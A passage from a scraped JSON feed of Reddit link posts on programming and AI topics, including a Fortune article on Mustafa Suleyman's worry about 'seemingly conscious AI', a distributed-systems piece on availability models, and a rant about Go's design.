Kubernetes. Then I install kagent in a vCluster - covering most of the quick start guide + adding in a self hosted LLM and ingress.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/mpetersen_loft-sh\"> /u/mpetersen_loft-sh </a>","contentLength":266,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mxc7w5/quick_background_and_demo_on_kagent_cloud_native/"},{"title":"Fruit face eatting themself.. (little cute) p.2","url":"https://v.redd.it/qf5tqgwbelkf1","date":1755877848,"author":"/u/shadow--404","guid":237077,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mxa77h/fruit_face_eatting_themself_little_cute_p2/"},{"title":"Vibe Debugging: Enterprises' Up and Coming Nightmare","url":"https://marketsaintefficient.substack.com/p/vibe-debugging-enterprises-up-and","date":1755877803,"author":"/u/bullionairejoker","guid":236981,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxa6hn/vibe_debugging_enterprises_up_and_coming_nightmare/"},{"title":"Microsoft AI CEO Suleyman is worried about ‘AI psychosis’ and AI that seems ‘conscious’","url":"https://fortune.com/2025/08/22/microsoft-ai-ceo-suleyman-is-worried-about-ai-psychosis-and-seemingly-conscious-ai/","date":1755877779,"author":"/u/fortune","guid":237205,"unread":true,"content":"<p>In a <a href=\"https://mustafa-suleyman.ai/\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://mustafa-suleyman.ai/\">new blog post,</a> Suleyman, who also cofounded <a href=\"https://fortune.com/company/alphabet/\" target=\"_blank\" aria-label=\"Go to https://fortune.com/company/alphabet/\">Google</a><a href=\"https://fortune.com/company/deepmind/\" target=\"_blank\" aria-label=\"Go to https://fortune.com/company/deepmind/\">DeepMind</a>, warned the world might be on the brink of AI models that are capable of convincing users that they are thinking, feeling, and having subjective experiences. He calls this concept “seemingly conscious AI” (SCAI).\n\n\n\n</p><p>In the near future, Suleyman predicts that models will be able to hold long conversations, remember past interactions, evoke emotional reactions from users, and potentially make convincing claims about having subjective experiences. He noted that these systems could be built with technologies that exist today, paired “with some that will mature over the next two to three years.”<p>The result of these features, he says, will be models that “imitate consciousness in such a convincing way that it would be indistinguishable from a claim that you or I might make to one another about our own consciousness.”\n\n\n\n</p></p><p>There are already some signs that people are convincing themselves that their AI chatbots are conscious beings and developing relationships with them that may not always be healthy. People are no longer just using chatbots as a tool, they are confiding in them, developing emotional attachments, and in some cases, falling in love. Some people are emotionally invested in particular versions of the AI models, leaving them feeling bereft when the AI model developers bring out new models and discontinue access to those versions. For example, OpenAI’s recent decision to replace GPT-4o with GPT-5 was met with an outcry of shock and anger from some users who had <a href=\"https://www.technologyreview.com/2025/08/15/1121900/gpt4o-grief-ai-companion/\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.technologyreview.com/2025/08/15/1121900/gpt4o-grief-ai-companion/\">formed emotional relationships with the version of ChatGPT powered by GPT-4o.</a></p><p>This is partly because of how AI tools are designed. The most common way users interact with AI is through chatbots, which mimic natural human conversations and are designed to be agreeable and flattering, sometimes to the point of sycophancy. But it’s also because of how people are using the tech. A recent survey of 6,000 regular AI users from the <a href=\"https://hbr.org/2025/04/how-people-are-really-using-gen-ai-in-2025\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"Go to https://hbr.org/2025/04/how-people-are-really-using-gen-ai-in-2025\">Harvard Business Review</a> found that “companionship and therapy” was the most common use case.</p><p>There has also been a wave of reports of “AI psychosis,” where users begin to experience paranoia or delusions about the systems they interact with. In one example, reported by the a New York accountant named Eugene Torres experienced a <a href=\"https://www.nytimes.com/2025/06/13/technology/chatgpt-ai-chatbots-conspiracies.html\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.nytimes.com/2025/06/13/technology/chatgpt-ai-chatbots-conspiracies.html\">mental health crisis</a> after interacting extensively with ChatGPT, leading to dangerous suggestions, including that he could fly.\n\n\n\n</p><p>“People are interacting with bots masquerading as real people, which are more convincing than ever,” Henry Ajder, an expert on AI and deepfakes, told . “So I think the impact will be wide-ranging in terms of who will start believing this.”\n\n\n\n</p><p>Suleyman is concerned that a widespread belief that AI could be conscious will create a new set of ethical dilemmas. \n\n\n\n</p><p>If users begin to treat AI as a friend, a partner, or as a type of being with a subjective experience, they could argue that models deserve rights of their own. Claims that AI models are conscious or sentient could be hard to refute owing to the elusive nature of consciousness itself.\n\n\n\n</p><p>One early example of what Suleyman is now calling “seemingly conscious AI” came in 2022, when Google engineer Blake Lemoine publicly claimed the company’s unreleased LaMDA chatbot was sentient, reporting it had expressed fear of being turned off and described itself as a person. In response Google placed him on administrative leave and later fired him, stating its internal review found no evidence of consciousness and that his claims were “wholly unfounded.”</p><p>“Consciousness is a foundation of human rights, moral and legal,” Suleyman <a href=\"https://x.com/mustafasuleyman/status/1957851195399348570\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"Go to https://x.com/mustafasuleyman/status/1957851195399348570\">said in a post on X</a>. “Who/what has it is enormously important. Our focus should be on the well-being and rights of humans, animals, [and] nature on planet Earth. AI consciousness is a short [and] slippery slope to rights, welfare, citizenship.\n\n\n\n</p><p>“If those AIs convince other people that they can suffer, or that it has a right to not to be switched off, there will come a time when those people will argue that it deserves protection under law as a pressing moral matter,” he wrote.\n\n\n\n</p><p>Debates around “AI welfare” have already begun. For example, <a href=\"https://www.theguardian.com/technology/2025/aug/18/anthropic-claude-opus-4-close-ai-chatbot-welfare\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"Go to https://www.theguardian.com/technology/2025/aug/18/anthropic-claude-opus-4-close-ai-chatbot-welfare\">some philosophers, including Jonathan Birch of the London School of Economics,</a> welcomed a recent decision by Anthropic to let its Claude chatbot end “distressing” conversations when users pushed it toward abusive or dangerous requests, saying it could spark a much-needed debate about AI’s potential moral status. Last year, Anthropic also <a href=\"https://www.transformernews.ai/p/anthropic-ai-welfare-researcher\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.transformernews.ai/p/anthropic-ai-welfare-researcher\">hired Kyle Fish</a> as its first full-time “AI welfare” researcher. He was tasked with investigating whether AI models could have moral significance and what protective interventions might be appropriate.\n\n\n\n</p><p>But while Suleyman called the arrival of seemingly conscious AI “inevitable and unwelcome,” neuroscientist and professor of computational neuroscience Anil Seth attributed the rise of conscious-seeming AI to a “design choice” by tech companies rather than an inevitable step in AI development.\n\n\n\n</p><p>“Seemingly conscious AI is something to avoid, I agree,” Seth <a href=\"https://x.com/anilkseth/status/1958099790438256642\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://x.com/anilkseth/status/1958099790438256642\">wrote in an X post.</a> “Conscious-seeming AI is not inevitable. It is a design choice, and one that tech companies need to be very careful about.”</p><p>Companies have a commercial motive to develop some of the features that Suleyman is warning of. At <a href=\"https://fortune.com/company/microsoft/\" target=\"_blank\" aria-label=\"Go to https://fortune.com/company/microsoft/\">Microsoft</a>, Suleyman himself has been overseeing efforts to make the company’s Copilot product more emotionally intelligent. His team has worked on giving the assistant humor and empathy, teaching it to recognize comfort boundaries, and improving its voice with pauses and inflection to make it sound more human.\n\n\n\n</p><p>Suleyman also cofounded Inflection AI in 2022 with the express aim of creating AI systems that foster more natural, emotionally intelligent interactions between humans and machines.\n\n\n\n</p><p>“Ultimately, these companies recognize that people want the most authentic-feeling experiences,” Ajder said. “That’s how a company can get customers using their products most frequently. They feel natural and easy. But I think it really comes to a question of whether people are going to start wondering about authenticity.”\n</p>","contentLength":6242,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mxa63h/microsoft_ai_ceo_suleyman_is_worried_about_ai/"},{"title":"Game application icons don’t show in GNOME but do in KDE","url":"https://www.reddit.com/r/linux/comments/1mx8zrg/game_application_icons_dont_show_in_gnome_but_do/","date":1755875122,"author":"/u/Tee-hee64","guid":237076,"unread":true,"content":"<p>I’ve been using Ubuntu for a while now and I like mostly everything about it except one thing that may seem minor to some but it’s the fact that game applications don’t show their logo. It’s a generic grey cogwheel. </p><p>I tried out Kubuntu since I heard that KDE doesn’t have this issue and they were correct. The issue is now gone. For that reason alone I’m staying on Kubuntu KDE. </p><p>Weird reason to distro hop, I know, but it’s good to have choice.</p>","contentLength":458,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Does Rust complexity ever bother you?","url":"https://www.reddit.com/r/rust/comments/1mx8izf/does_rust_complexity_ever_bother_you/","date":1755874050,"author":"/u/GolangLinuxGuru1979","guid":237073,"unread":true,"content":"<p>I'm a Go developer and I've always had a curiosity about Rust. I've tried to play around and start some personal project in it a few times. And it's mostly been ok. Like I tried to use <a href=\"http://hyper.rs\">hyper.rs</a> a few times, but the boilerplate takes a lot to understand in many of the examples. I've tried to use tokio, but the library is massive, and it gets difficult to understand which modules to important and now important. On top of that it drastically change the async functons</p><p>I'm saying all that to say Rust is very complicated. And while I do think there is a fantastic langauge under all that complexity, it prohibitively complex. I do get it that memory safety in domains like RTOS systems or in government spaces is crucial. But it feels like Rust thought leaders are trying to get the language adopted in other domains. Which I think is a bit of an issue because you're not competing with other languages where its much easier to be productive in.</p><p>Here is my main gripe with the adoption. Lots of influencers in the Rust space just seem to overlook its complexity as if its no big deal. Or you have others who embrace it because Rust \"has to be complex\". But I feel in the enterprise (where adoption matters most), no engineering manager is really going to adopt a language this complex.</p><p>Now I understand languages like C# and Java can be complex as well. But Java at one time was looked at as a far simpler version of C++, and was an \"Easy language\". It would grow in complexity as the language grew and the same with C#. And then there is also tooling to kind of easy you into the more complex parts of these languages.</p><p>I would love to see Rust adopted more, I would. But I feel advociates aren't leaning into its domain where its an open and shut case for (mission critical systems requiring strict safety standards). And is instead also trying to compete in spaces where Go, Javascript, Java already have a strong foothold.</p><p>Again this is not to critcize Rust. I like the language. But I feel too many people in the Rust community talk around its complexity.</p>","contentLength":2054,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Cargo inspired C/C++ build tool, written in rust","url":"https://github.com/EmVance1/VanGo","date":1755872267,"author":"/u/MNGay","guid":237125,"unread":true,"content":"<p>Using rust for the past 3 years or so got me thinking, why can't it always be this easy? Following this, I've spent the last 10 months (on-off due to studies) developing a tool for personal use, and I'd love to see what people think about it. Introducing VanGo, if you'll excuse the pun.</p>","contentLength":287,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mx7rnc/cargo_inspired_cc_build_tool_written_in_rust/"},{"title":"I wasn't taught Git in school","url":"https://www.youtube.com/watch?v=jBnrUcK3C2I","date":1755871414,"author":"/u/-Kkdark","guid":236937,"unread":true,"content":"<p>I want to take a minute to talk about people who say “I wasn’t taught Git in school.” This line is everywhere on Reddit, on Twitter, and in dev circles. It gets thrown around as if it’s some kind of defense for why they never bothered to learn version control.</p><p>And honestly, it’s not just Git. People love to blame school for not covering all kinds of stuff: “They don’t teach that in school, they don’t teach this in school.” Well, of course they don’t! Because it’s a school. The point isn’t to spoon-feed you every single topic you might someday find useful. Schools are supposed to teach you things that are mentally demanding and foundational, not every single practical tool you could easily self-learn. That’s why you pay the big tuition (for fundamentals, theory, and hard concepts). Would you really want to pay thousands just to be walked through stuff you could learn in a couple afternoons online? You signed up for computer science which is an insanely big and evolving field (which is possibly a bit different than studying Physics or other sciences in school), and you sure as hell also signed up for extra work outside of school not just going over the assigned readings.</p><p>Sorry if this sounds a bit harsh, but you really don’t need to be “taught” Git. Even if you’re just dabbling in programming, you should be learning things on your own. The teacher, the course, or the school can’t possibly cover everything. They focus on the fundamentals, which already take a lot of time to grasp, and I assume that’s what your school did. The rest is on you. If you’re blaming your school for not teaching you Git, you’re just making excuses for your own laziness. </p>","contentLength":1711,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mx7enr/i_wasnt_taught_git_in_school/"},{"title":"Go concurrency without the channel gymnastics","url":"https://www.reddit.com/r/golang/comments/1mx7art/go_concurrency_without_the_channel_gymnastics/","date":1755871173,"author":"/u/marketbase","guid":236982,"unread":true,"content":"<p>Hey y’all. I noticed every time I fan-in / fan-out in Go, I end up writing the same channel boilerplate. Got tired of it, so I built a library to one-line the patterns.</p><pre><code>// Before sem := make(chan struct{}, 3) results := make(chan int, len(tasks)) for _, task := range tasks { sem &lt;- struct{}{} go func(task func() (int, error)) { defer func() { &lt;-sem }() result, err := task() if err != nil { // handle or ignore; kept simple here } results &lt;- result }(task) } for range tasks { fmt.Println(&lt;-results) } // After results, err := gliter.InParallelThrottle(3, tasks) </code></pre><pre><code>// Before jobs := make(chan int, len(tasks)) results := make(chan int, len(tasks)) // fan-out for i := 0; i &lt; 3; i++ { go worker(jobs, results) } // send jobs for _, job := range tasks { jobs &lt;- job } close(jobs) // fan-in for range tasks { fmt.Println(&lt;-results) } // After results, errors := gliter.NewWorkerPool(3, handler). Push(1, 2, 3, 4). Close(). Collect() </code></pre><p>Didn’t think it was special at first, but I keep reaching for it out of convenience. What do you think, trash or treasure?</p>","contentLength":1055,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Quickly navigate in man pages, using emacs, neovim or w3m.","url":"https://codeberg.org/chimay/blog/src/commit/02bdd1d592f7130c2dd2cc13e35a63c551387e91/meta/man-pages.org","date":1755870977,"author":"/u/orduval","guid":237022,"unread":true,"content":"<p>\nNeovim offers a nice man view with the  command.  It can handle\nreferences by using  over the word, which can easily be remapped to\nthe return key.</p><p>\nIt even has a table of content, but it's too cluttered for my taste, so I\ndecided to write my own version of it, displaying only the minimum I need.</p><p>\nFirst, let's write some functions in ~/.config/nvim/autoload/library.vim :</p><div><pre><code>## %\n\t# %\n\t##</code></pre></div><p>\nThen, go back to ~/.config/nvim/init.vim and let's map the \nwrapper to e.g.  :</p><div><pre><code>#</code></pre></div><p>\nFinally, use buffer local maps triggered when\nentering a man buffer :</p><div><pre><code>####</code></pre></div><p>\nDone! Now, try  and enter e.g.  to the prompt.  The key :</p><ul><li> opens the toc/link window</li><li> closes the toc/link window</li><li> deletes the man page buffer</li></ul><p>In the man buffer, you can press  (enter) over a reference\n(i.e. link) to follow it.</p>","contentLength":762,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mx77vh/quickly_navigate_in_man_pages_using_emacs_neovim/"},{"title":"[D] Low-budget hardware for on-device object detection + VQA?","url":"https://www.reddit.com/r/MachineLearning/comments/1mx775g/d_lowbudget_hardware_for_ondevice_object/","date":1755870929,"author":"/u/fishandtech","guid":236918,"unread":true,"content":"<p>I’m an undergrad working on my FYP and need advice. I want to:</p><ul><li>Run object detection on medical images (PNGs).</li><li>Do visual question answering with a ViT or small LLaMA model.</li><li>Everything fully on-device (no cloud).</li></ul><p>Budget is tight, so I’m looking at Jetson boards (Nano, Orin Nano, Orin NX) but not sure which is realistic for running a quantized detector + small LLM for VQA.</p><p>Anyone here tried this? What hardware would you recommend for the best balance of cost + capability?</p>","contentLength":472,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Availability Models: Because “Highly Available” Isn’t Saying Much","url":"https://www.thecoder.cafe/p/availability-models","date":1755870555,"author":"/u/teivah","guid":237126,"unread":true,"content":"<p><em>Hello! Last week, we reached 3,000 subscribers, that’s awesome, thank you all!</em></p><p>Here are two database whitepapers:</p><ul><li><p><a href=\"https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf\" rel=\"\">Dynamo</a></p></li></ul><p>Let’s first look at what availability means, then discuss why high availability is a vague concept, and finally explore the different availability models.</p><blockquote><p>Every request receives a non-error response, even if it may not contain the most up-to-date data.</p></blockquote><p><a href=\"https://www.thecoder.cafe/p/pacelc\" rel=\"\">The PACELC Theorem</a></p><ul><li><p>In the presence of a partition, a system must choose between availability and consistency.</p></li><li><p>In the absence of partition, a system must choose between latency (the upper-bound limit during which a request should receive a non-error response) and consistency.</p></li></ul><p><strong>Availability isn’t just about uptime; it's also about whether the system is responsive in a meaningful timeframe.</strong></p><p>The term high availability is vague. Does it mean 99.9% uptime? 99.999%?</p><p><a href=\"https://www.scylladb.com/glossary/high-availability-database/\" rel=\"\">technical glossary</a><strong>maintaining levels of uptime that exceed normal SLAs</strong></p><p>Say we define an SLA at 50%, then run at 80%. Technically, we exceeded it. Yet, does that mean we’re offering a highly available database? Probably not.</p><p><a href=\"https://antithesis.com/resources/reliability_glossary\" rel=\"\">Antithesis reliability glossary</a><strong>a system that is available more often than a single node</strong></p><p>Still, it’s not perfect. Let’s say we have five nodes, each available 50% of the time. With a write quorum of two, our write availability might still reach ~80%. But we’d still be down one request out of five. Hard to sell that as high availability.</p><p>To bring more clarity to the conversation, Antithesis introduced a set of availability models.</p><p><strong>An availability model is something to help us define when an operation should succeed.</strong></p><p>What do we mean by operation? It’s simply a request made to the system. That could be a read, a write, a ping, whatever the system is supposed to handle. Instead of thinking in terms of the whole system being up or down, we look at whether a specific request can succeed, even when parts of the system are failing.</p><p>Let’s explore three availability models.</p><p>Consider a database composed of five nodes:</p><p>In the nominal case, everything works: a client connects, and the database can process all operations.</p><p>Now, imagine two nodes go down. Maybe they crash, maybe there’s a network issue causing a partition:</p><p><strong>we say it’s majority available</strong></p><p><strong>This model is often used when consistency matters.</strong></p><p>Let’s take the same setup: a database with five nodes. This time, three of them are faulty:</p><p><strong>But in a totally available model, the system can still handle operations.</strong></p><p>Indeed, in this model, each non-faulty node can act on its own. It doesn’t need to coordinate with others or wait for a network round-trip. This model favors latency. Just handle the request and move on.</p><p><a href=\"https://www.thecoder.cafe/p/consistency-model\" rel=\"\">consistency models</a></p><p>Let’s look at an example. Two clients, A and B, are connected to a database and make updates over time:</p><ul><li><p>After update 5, client A will eventually get a response that reflects at least updates 1, 4, and 5.</p></li><li><p>After update 3, client B will eventually get a response that reflects at least updates 2 and 3.</p></li></ul><p>How can we achieve that? It depends on how replication is handled by the system.</p><p><strong>Sticky availability can be achieved by making sure a client always talks to the same node.</strong></p><p>Here’s the same example again, but now with client A always connected to node 1, and client B to node 2:</p><p><strong>they eventually see a consistent view of their own operations</strong></p><p>Now, let’s discuss a partially replicated system where nodes are replicas for subsets of data items.</p><p>Here’s a (dummy) partitioning system where even-numbered updates go to node 1 and odd-numbered ones to node 2:</p><p><strong>Instead, they must maintain stickiness with a single logical copy of the database, which may consist of multiple nodes.</strong></p><p><strong>Clients can also help implement this model by acting as servers themselves.</strong></p><ul><li><p>Highly available is too vague; watch out when you read or hear it. It might mean different things depending on the system or author.</p></li><li><p>Majority available means a majority of nodes can still perform some operations. This model supports stronger consistency.</p></li><li><p>Totally available means each non-faulty node can handle requests independently. It favors latency, but usually comes with weaker consistency.</p></li><li><p>Sticky available means clients can make progress as long as they keep talking to a replica that reflects their own history.</p></li><li><p>Availability models help us reason at the operation level, not just the system level. What matters is which operation can succeed, and under what conditions.</p></li></ul><p><em>If you enjoyed the post, please consider giving it a like. It’s a helpful signal to decide what to write next.</em></p><p><em>When someone says their system is “highly available,” what do you assume they mean?</em></p>","contentLength":4572,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mx71mj/availability_models_because_highly_available_isnt/"},{"title":"Independent benchmark of GPT-5 vs Claude 4 Sonnet across 200 diverse prompts.","url":"https://github.com/Cubent-Dev/Benchmark-GPT-5-vs-Claude-4-Sonnet-on-200-Requests","date":1755869644,"author":"/u/NoahDAVISFFX","guid":236916,"unread":true,"content":"<div><p>Key insights: GPT-5 excels in reasoning and code; Claude 4 Sonnet is faster and slightly more precise on factual tasks.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/NoahDAVISFFX\"> /u/NoahDAVISFFX </a>","contentLength":154,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mx6odd/independent_benchmark_of_gpt5_vs_claude_4_sonnet/"},{"title":"Centrally Collecting Events from Go Microservices","url":"https://pliutau.com/centrally-collecting-events-in-go-microservices/","date":1755868657,"author":"/u/der_gopher","guid":237222,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mx6a03/centrally_collecting_events_from_go_microservices/"},{"title":"AI-generated ‘slop’ is slowly killing the internet?","url":"https://www.theguardian.com/global/commentisfree/2025/jan/08/ai-generated-slop-slowly-killing-internet-nobody-trying-to-stop-it","date":1755867931,"author":"/u/Ok-Ad7050","guid":236917,"unread":true,"content":"<div><p>ow do you do, fellow humans? My name is Arwa and I am a genuine member of the species . We’re talking a 100% flesh-and-blood person operating in <a href=\"https://www.merriam-webster.com/wordplay/what-is-meatspace\" data-link-name=\"in body link\">meatspace</a> over here; I am absolutely not an AI-powered bot. I know, I know. That’s exactly what a bot would say, isn’t it? I guess you’re just going to have to trust me on this.</p><p>I’m taking great pains to point this out, by the way, because content created by real life human beings is becoming something of a novelty these days. The internet is rapidly being overtaken by AI slop. (It’s not clear who coined the phrase but “slop” is the advanced iteration of internet spam: low-quality text, videos and images generated by AI.) A <a href=\"https://www.wired.com/story/linkedin-ai-generated-influencers/#:~:text=A%20new%20analysis%20estimates%20that,tools%20has%20been%20a%20success.\" data-link-name=\"in body link\">recent analysis</a> estimated that more than half of longer English-language posts on LinkedIn are AI-generated. Meanwhile, many news sites have covertly been experimenting with AI-generated content – bylined, in some cases, by <a href=\"https://www.pbs.org/newshour/economy/sports-illustrated-found-publishing-ai-generated-stories-photos-and-authors\" data-link-name=\"in body link\">AI-generated authors</a>.</p><p>Slop is everywhere but Facebook is positively sloshing with weird AI-generated images, including strange depictions of <a href=\"https://www.niemanlab.org/2024/04/from-shrimp-jesus-to-fake-self-portraits-ai-generated-images-have-become-the-latest-form-of-social-media-spam/\" data-link-name=\"in body link\">Jesus made out of shrimps</a>. Rather than trying to rid its platform of AI-generated content – much of which has been created by scammers trying to drive engagement for <a href=\"https://www.forbes.com/sites/bernardmarr/2023/05/16/the-danger-of-ai-content-farms/\" data-link-name=\"in body link\">nefarious purposes</a> – Facebook has embraced it. A study conducted last year by researchers out of Stanford and Georgetown found Facebook’s recommendation algorithms are boosting <a href=\"https://www.npr.org/2024/05/14/1251072726/ai-spam-images-facebook-linkedin-threads-meta\" data-link-name=\"in body link\">these AI-generated posts</a>.</p><p>Meta has also been creating its own slop. In 2023, the company started introducing AI-powered profiles such as Liv: a “proud Black queer momma of 2 &amp; truth-teller”. These didn’t get a lot of attention until Meta executive Connor Hayes told the<a href=\"https://www.ft.com/content/91183cbb-50f9-464a-9d2e-96063825bfcf?ref=404media.co\" data-link-name=\"in body link\">Financial Times</a>in December that the company had plans to fill its platform with AI characters. I’m not sure why he thought that boasting the platform would soon be full of AI characters talking to each other would go down well, but, it didn’t: Meta swiftly killed off the AI-profiles <a href=\"https://www.theguardian.com/technology/2025/jan/03/meta-ai-powered-instagram-facebook-profiles\" data-link-name=\"in body link\">after they went viral</a>.</p><p>The likes of Liv may be gone from Meta for now, but our online future seems to be getting sloppier and sloppier. What Cory Doctorow memorably termed the gradual “<a href=\"https://www.theguardian.com/science/2024/nov/26/enshittification-macquarie-dictionary-word-of-the-year-explained\" data-link-name=\"in body link\">enshittification</a>” of the internet (the degradation of services in pursuit of relentless profit-seeking) is accelerating. Let’s hope Shrimp Jesus performs a miracle soon; we need it.</p></div>","contentLength":2338,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mx5zpp/aigenerated_slop_is_slowly_killing_the_internet/"},{"title":"What are the best practices for defining Requests?","url":"https://www.reddit.com/r/kubernetes/comments/1mx5qx9/what_are_the_best_practices_for_defining_requests/","date":1755867316,"author":"/u/Electronic-Kitchen54","guid":236885,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Technology is generally really good. Why should AI be any different?","url":"https://v.redd.it/5h0nhafcfkkf1","date":1755866364,"author":"/u/katxwoods","guid":237183,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mx5dyd/technology_is_generally_really_good_why_should_ai/"},{"title":"Coding a database proxy for fun","url":"https://www.youtube.com/watch?v=DU7_MQmRDUs","date":1755865509,"author":"/u/der_gopher","guid":237025,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mx52kt/coding_a_database_proxy_for_fun/"},{"title":"[D] Why does BYOL/JEPA like models work? How does EMA prevent model collapse?","url":"https://www.reddit.com/r/MachineLearning/comments/1mx4a6c/d_why_does_byoljepa_like_models_work_how_does_ema/","date":1755863264,"author":"/u/ComprehensiveTop3297","guid":236889,"unread":true,"content":"<p>I am curious on your takes on BYOL/JEPA like training methods and the intuitions/mathematics behind why the hell does it work?</p><p>From an optimization perspective, without the EMA parameterization of the teacher model, the task would be very trivial and it would lead to model collapse. However, EMA seems to avoid this. Why?</p><p>How can a network learn semantic embeddings without reconstructing the targets in the real space? Where is the learning signal coming from? Why are these embeddings so good?</p><p>I had great success with applying JEPA like architectures to diverse domains and I keep seeing that model collapse can be avoided by tuning the LR scheduler/EMA schedule/masking ratio. I have no idea why this avoids the collapse though.</p>","contentLength":730,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Go is still not good","url":"https://blog.habets.se/2025/07/Go-is-still-not-good.html","date":1755863196,"author":"/u/Nekuromento","guid":236888,"unread":true,"content":"<p>These things about Go are bugging me more and more. Mostly because they’re so\nunnecessary. The world knew better, and yet Go was created the way it was.</p><p>For readers of previous posts you’ll find some things repeated here. Sorry\nabout that.</p><h2>Error variable scope is forced to be wrong</h2><p>Here’s an example of the language forcing you to do the wrong thing. It’s very\nhelpful for the reader of code (and code is read more often than it’s written),\nto minimize the scope of a variable. If by mere syntax you can tell the reader\nthat a variable is just used in these two lines, then that’s a good thing.</p><div><pre><code></code></pre></div><p>(enough has been said about this verbose repeated boilerplate that I don’t have\nto. I also don’t particularly care)</p><p>So that’s fine. The reader knows  is here and only here.</p><p>But then you encounter this:</p><div><pre><code></code></pre></div><p>Wait, what? Why is  reused for ? Is there’s something subtle I’m\nnot seeing? Even if we change that to , we’re left to wonder why  is\nin scope for (potentially) the rest of the function. Why? Is it read later?</p><p>Especially when looking for bugs, an experienced coder will see these things\nand slow down, because here be dragons. Ok, now I’ve wasted a couple of seconds\non the red herring of reusing  for .</p><p>Is a bug perhaps that the function ends with this?</p><div><pre><code></code></pre></div><p>Why does the scope of  extend way beyond where it’s relevant?</p><p>The code would have been so much easier to read if only ’s scope had been\nsmaller. But that’s not syntactically possible in Go.</p><p>This was not thought through. Deciding on this was not thinking, it was typing.</p><div><pre><code></code></pre></div><p>“What color is your nil?” — The two billion dollar mistake.</p><p>The reason for the difference boils down to again, not thinking, just typing.</p><p>Adding comment near the top of the file for conditional compilation must be the\ndumbest thing ever. Anybody who’s actually tried to maintain a portable program\nwill tell you this will only cause suffering.</p><p>The problem is that this is not year 350 BCE. We actually have experience that\naside from air resistance, heavy and light objects actually fall at the same\nspeed. And we have experience with portable programs, and would not do\nsomething this dumb.</p><p>If this had been the year 350 BCE, then this could be forgiven. Science as we\nknow it hadn’t been invented yet. But this is after decades of very widely\navailable experience in portability.</p><h2> with no defined ownership</h2><div><pre><code></code></pre></div><p>Probably . Who wants that? Nobody wants that.</p><div><pre><code></code></pre></div><p>If you guessed , then you know more than anybody should have\nto know about quirks of a stupid programming language.</p><p>Even in a GC language, sometimes you just can’t wait to destroy a resource. It\nreally does need to run as we leave the local code, be it by normal return, or\nvia an exception (aka panic).</p><p>What we clearly want is RAII, or something like it.</p><div><pre><code></code></pre></div><p>Python has it. Though Python is  entirely refcounted, so one can pretty\nmuch rely on the  finalizer being called. But if it’s important, then\nthere’s the  syntax.</p><div><pre><code></code></pre></div><p>Go? Go makes you go read the manual and see if this particular resource needs\nto have a defer function called on it, and which one.</p><div><pre><code></code></pre></div><p>This is so dumb. Some resources need a defer destroy. Some don’t. Which ones?\nGood fucking luck.</p><p>And you also regularly end up with stuff like this monstrosity:</p><div><pre><code></code></pre></div><p>Yes, this is what you NEED to do to safely write something to a file in Go.</p><p>What’s this, a ? Oh yeah, of course that’s needed. Is it even\nsafe to double-close, or does my defer need to check for that? It happens to be\nsafe on , but on other things: WHO KNOWS?!</p><h2>The standard library swallows exceptions, so all hope is lost</h2><p>Go says it doesn’t have exceptions. Go makes it extremely awkward to use\nexceptions, because they want to punish programmers who use them.</p><p>But all Go programmers must still write exception safe code. Because while\n don’t use exceptions, other code will. Things will panic.</p><p>So you need, not should, NEED, to write code like:</p><div><pre><code></code></pre></div><p>What is this stupid middle endian system? That’s dumb just like putting the day\nin the middle of a date is dumb. MMDDYY, honestly? (separate rant)</p><p>But panic will terminate the program, they say, so why do you care if you\nunlock a mutex five milliseconds before it exits anyway?</p><p>Because what if something swallows that exception and carries on as normal, and\nyou’re now stuck with a locked mutex?</p><p>But surely nobody would do that? Reasonable and strict coding standards would\nsurely prevent it, under penalty of being fired?</p><p>The standard library does that.  when calling , and the\nstandard library HTTP server does that, for exceptions in the HTTP handlers.</p><p>All hope is lost. You MUST write exception safe code. But you can’t use\nexceptions. You can only have the downsides of exceptions be thrust upon you.</p><p>Don’t let them gaslight you.</p><h2>Sometimes things aren’t UTF-8</h2><p>If you stuff random binary data into a , Go just steams along, as\ndescribed <a 